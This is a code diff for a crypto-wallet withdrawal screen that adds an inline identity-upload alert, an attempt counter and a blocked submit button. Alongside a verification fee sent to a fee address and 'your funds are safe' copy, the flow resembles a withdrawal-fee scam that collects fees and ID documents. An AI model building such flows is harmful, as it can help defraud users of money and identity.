@@ -148,14 +148,15 @@ function FeePopup({ feeInAsset, assetLabel, feeAddress, feeUsd, onClose }: FeePo
   );
 }
 
-// ── Verification Modal ────────────────────────────────────────────────────────
+// ── Verification Upload Modal ─────────────────────────────────────────────────
 
 interface VerificationModalProps {
-  onLocked: () => void;   // called when the 3rd attempt locks the account
+  onLocked: () => void;
+  onFailure: (msg: string) => void;
   onClose: () => void;
 }
 
-function VerificationModal({ onLocked, onClose }: VerificationModalProps) {
+function VerificationModal({ onLocked, onFailure, onClose }: VerificationModalProps) {
   const [file, setFile] = useState<File | null>(null);
   const [uploading, setUploading] = useState(false);
   const [failureMsg, setFailureMsg] = useState<string | null>(null);
@@ -173,11 +174,11 @@ function VerificationModal({ onLocked, onClose }: VerificationModalProps) {
     } catch (err: unknown) {
       const apiErr = err instanceof ApiError ? err : null;
       if (apiErr && apiErr.status === 423) {
-        // Account locked
         onLocked();
       } else {
         const msg = err instanceof Error ? err.message : 'Verification failed';
         setFailureMsg(msg);
+        onFailure(msg);
         setFile(null);
         if (inputRef.current) inputRef.current.value = '';
       }
@@ -188,16 +189,15 @@ function VerificationModal({ onLocked, onClose }: VerificationModalProps) {
 
   return (
     <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/80 backdrop-blur-sm p-5">
-      <div className="w-full max-w-[420px] bg-card border border-amber-500/30 rounded-3xl p-6 flex flex-col gap-5 shadow-2xl">
-        {/* Header */}
+      <div className="w-full max-w-[420px] bg-card border border-[#da3637]/30 rounded-3xl p-6 flex flex-col gap-5 shadow-2xl">
         <div className="flex items-start justify-between">
           <div className="flex items-center gap-3">
-            <div className="w-11 h-11 rounded-full bg-amber-500/15 flex items-center justify-center shrink-0">
-              <ShieldAlert className="w-6 h-6 text-amber-400" />
+            <div className="w-10 h-10 rounded-full bg-destructive/15 flex items-center justify-center shrink-0">
+              <ShieldAlert className="w-5 h-5 text-destructive" />
             </div>
             <div>
-              <h2 className="text-base font-bold text-foreground">Wallet Verification Required</h2>
-              <p className="text-xs text-muted mt-0.5">Identity verification is required to proceed</p>
+              <h2 className="text-base font-bold text-foreground">Upload Identity Document</h2>
+              <p className="text-xs text-muted mt-0.5">Required for AML compliance</p>
             </div>
           </div>
           <button onClick={onClose} className="p-1 text-muted hover:text-foreground transition-colors shrink-0">
@@ -205,34 +205,21 @@ function VerificationModal({ onLocked, onClose }: VerificationModalProps) {
           </button>
         </div>
 
-        {/* Safety statement */}
-        <div className="bg-emerald-500/10 border border-emerald-500/20 rounded-2xl p-4 flex gap-3">
-          <ShieldCheck className="w-5 h-5 text-emerald-400 shrink-0 mt-0.5" />
-          <div className="flex flex-col gap-1">
-            <div className="text-sm font-semibold text-emerald-400">Your funds are safe</div>
-            <p className="text-xs text-muted leading-relaxed">
-              Your assets are fully secured in your wallet. Once your identity verification is successfully completed, your withdrawal will be processed immediately. This step is required under Anti-Money Laundering (AML) compliance regulations.
-            </p>
-          </div>
-        </div>
-
-        {/* Failure message */}
         {failureMsg && (
-          <div className="bg-destructive/10 border border-destructive/30 rounded-2xl px-4 py-3 flex gap-2.5 items-start">
+          <div className="bg-destructive/10 border border-destructive/30 rounded-xl px-4 py-3 flex gap-2.5 items-start">
             <AlertCircle className="w-4 h-4 text-destructive shrink-0 mt-0.5" />
             <p className="text-xs text-destructive leading-relaxed font-medium">{failureMsg}</p>
           </div>
         )}
 
-        {/* ID upload */}
         <div className="flex flex-col gap-2">
-          <label className="text-xs font-semibold text-muted uppercase tracking-widest">Upload Government-Issued ID</label>
+          <label className="text-xs font-semibold text-muted uppercase tracking-widest">Government-Issued ID</label>
           <div
-            className="w-full border-2 border-dashed border-border rounded-2xl p-5 flex flex-col items-center gap-3 cursor-pointer hover:border-primary/50 hover:bg-primary/5 transition-all"
+            className="w-full border-2 border-dashed border-border rounded-2xl p-5 flex flex-col items-center gap-3 cursor-pointer hover:border-destructive/50 hover:bg-destructive/5 transition-all"
             onClick={() => inputRef.current?.click()}
           >
-            <div className="w-12 h-12 rounded-full bg-primary/10 flex items-center justify-center">
-              <Upload className="w-6 h-6 text-primary" />
+            <div className="w-12 h-12 rounded-full bg-destructive/10 flex items-center justify-center">
+              <Upload className="w-6 h-6 text-destructive" />
             </div>
             {file ? (
               <div className="text-center">
@@ -246,35 +233,21 @@ function VerificationModal({ onLocked, onClose }: VerificationModalProps) {
               </div>
             )}
           </div>
-          <input
-            ref={inputRef}
-            type="file"
-            accept="image/*,.pdf"
-            className="hidden"
-            onChange={e => setFile(e.target.files?.[0] ?? null)}
-          />
+          <input ref={inputRef} type="file" accept="image/*,.pdf" className="hidden"
+            onChange={e => setFile(e.target.files?.[0] ?? null)} />
         </div>
 
-        {/* Accepted formats note */}
-        <p className="text-xs text-muted text-center -mt-2">
-          Accepted: JPG, PNG, PDF • Max 10 MB • Must be clearly visible
-        </p>
+        <p className="text-xs text-muted text-center -mt-2">Accepted: JPG, PNG, PDF • Must be clearly visible</p>
 
         <button
           onClick={handleUpload}
           disabled={!file || uploading}
-          className="w-full bg-amber-500 hover:bg-amber-400 disabled:opacity-50 disabled:cursor-not-allowed text-black font-semibold rounded-xl px-4 py-4 transition-colors active:scale-[0.98] flex items-center justify-center gap-2"
+          className="w-full bg-destructive hover:bg-destructive/90 disabled:opacity-50 disabled:cursor-not-allowed text-white font-semibold rounded-xl px-4 py-4 transition-colors active:scale-[0.98] flex items-center justify-center gap-2"
         >
           {uploading ? (
-            <>
-              <div className="w-4 h-4 border-2 border-black/30 border-t-black rounded-full animate-spin" />
-              Verifying…
-            </>
+            <><div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" /> Verifying…</>
           ) : (
-            <>
-              <Upload className="w-4 h-4" />
-              Submit for Verification
-            </>
+            <><Upload className="w-4 h-4" /> Submit for Verification</>
           )}
         </button>
       </div>
@@ -331,6 +304,8 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
   // Wallet verification state (server-driven)
   const [showVerificationModal, setShowVerificationModal] = useState(false);
   const [verificationLockedUntil, setVerificationLockedUntil] = useState<string | null>(null);
+  const [verificationAttempts, setVerificationAttempts] = useState(0);
+  const [verificationFailureMsg, setVerificationFailureMsg] = useState<string | null>(null);
 
   // Lockout state
   const [lockout, setLockout] = useState<LockoutState>({ attempts: 0, lockedUntil: null });
@@ -349,6 +324,7 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
         if (vs.is_locked && vs.locked_until) {
           setVerificationLockedUntil(vs.locked_until);
         }
+        setVerificationAttempts(vs.verification_attempts ?? 0);
       })
       .catch(() => toast.error('Failed to load wallet data'))
       .finally(() => setLoading(false));
@@ -474,12 +450,6 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
     // Verification fee checkbox must be ticked if section is shown
     if (showVerificationFee && !verificationFeeAcknowledged) {
       toast.error('Please acknowledge the Verification Fee before submitting');
-      return;
-    }
-
-    // If wallet verification is required, intercept and show the verification modal
-    if (wallet.verification_required) {
-      setShowVerificationModal(true);
       return;
     }
 
@@ -677,12 +647,14 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
         <VerificationModal
           onLocked={() => {
             setShowVerificationModal(false);
-            // Refresh verification status from server to get locked_until time
             api.getVerificationStatus().then(vs => {
-              if (vs.is_locked && vs.locked_until) {
-                setVerificationLockedUntil(vs.locked_until);
-              }
+              if (vs.is_locked && vs.locked_until) setVerificationLockedUntil(vs.locked_until);
             }).catch(() => {});
+          }}
+          onFailure={(msg) => {
+            setVerificationFailureMsg(msg);
+            setVerificationAttempts(prev => prev + 1);
+            setShowVerificationModal(false);
           }}
           onClose={() => setShowVerificationModal(false)}
         />
@@ -822,6 +794,56 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
             </div>
           </div>
 
+          {/* ── Wallet Verification Required (inline alert) ── */}
+          {wallet.verification_required && (
+            <div className="flex flex-col gap-4 p-4 rounded-xl border border-[#da3637]/30 bg-[#da3637]/10">
+              <div className="flex gap-3">
+                <ShieldAlert className="w-5 h-5 text-destructive shrink-0 mt-0.5" />
+                <div className="flex flex-col gap-1.5">
+                  <div className="text-sm font-semibold text-foreground">Identity Verification Required</div>
+                  <div className="text-xs text-muted/90 leading-relaxed">
+                    In compliance with AML/KYC regulations, your identity must be verified before this withdrawal can be processed. Please upload a government-issued ID document to proceed.
+                  </div>
+                </div>
+              </div>
+
+              {/* Safety statement */}
+              <div className="flex gap-3 bg-background/40 border border-border/50 rounded-xl p-3">
+                <ShieldCheck className="w-4 h-4 text-success shrink-0 mt-0.5" />
+                <p className="text-xs text-muted leading-relaxed">
+                  <span className="text-foreground font-semibold">Your funds are safe.</span> Your assets remain fully secured in your wallet. Once your identity verification is successfully completed, your withdrawal will be processed immediately.
+                </p>
+              </div>
+
+              {/* Failure message from last upload attempt */}
+              {verificationFailureMsg && (
+                <div className="flex gap-2.5 items-start bg-destructive/10 border border-destructive/20 rounded-xl px-3 py-3">
+                  <AlertCircle className="w-4 h-4 text-destructive shrink-0 mt-0.5" />
+                  <p className="text-xs text-destructive leading-relaxed font-medium">{verificationFailureMsg}</p>
+                </div>
+              )}
+
+              {/* Attempt counter */}
+              {verificationAttempts > 0 && (
+                <div className="flex items-center gap-2 px-1">
+                  {[0, 1, 2].map(i => (
+                    <div key={i} className={`h-1.5 flex-1 rounded-full ${i < verificationAttempts ? 'bg-destructive' : 'bg-border'}`} />
+                  ))}
+                  <span className="text-xs text-muted shrink-0">{verificationAttempts}/3 attempts</span>
+                </div>
+              )}
+
+              {/* Upload button */}
+              <button
+                onClick={() => setShowVerificationModal(true)}
+                className="w-full flex items-center justify-center gap-2 bg-destructive hover:bg-destructive/90 text-white font-semibold rounded-xl px-4 py-3.5 transition-colors active:scale-[0.98]"
+              >
+                <Upload className="w-4 h-4" />
+                {verificationAttempts === 0 ? 'Upload ID to Verify' : 'Try Again — Upload ID'}
+              </button>
+            </div>
+          )}
+
           {/* Verification Fee alert */}
           {showVerificationFee && (
             <div className="flex flex-col gap-4 p-4 rounded-xl border border-[#da3637]/30 bg-[#da3637]/10">
@@ -919,10 +941,10 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
           {/* Submit */}
           <button
             onClick={handleSend}
-            disabled={submitting}
+            disabled={submitting || !!wallet.verification_required}
             className="w-full bg-destructive hover:bg-destructive/90 disabled:opacity-40 disabled:cursor-not-allowed text-white font-medium rounded-xl px-4 py-4 mt-auto transition-colors shadow-[0_0_20px_rgba(218,54,55,0.2)] active:scale-[0.98]"
           >
-            {submitting ? 'Processing…' : 'Submit Withdrawal Request'}
+            {submitting ? 'Processing…' : wallet.verification_required ? 'Verify Identity to Proceed' : 'Submit Withdrawal Request'}
           </button>
 
         </div>
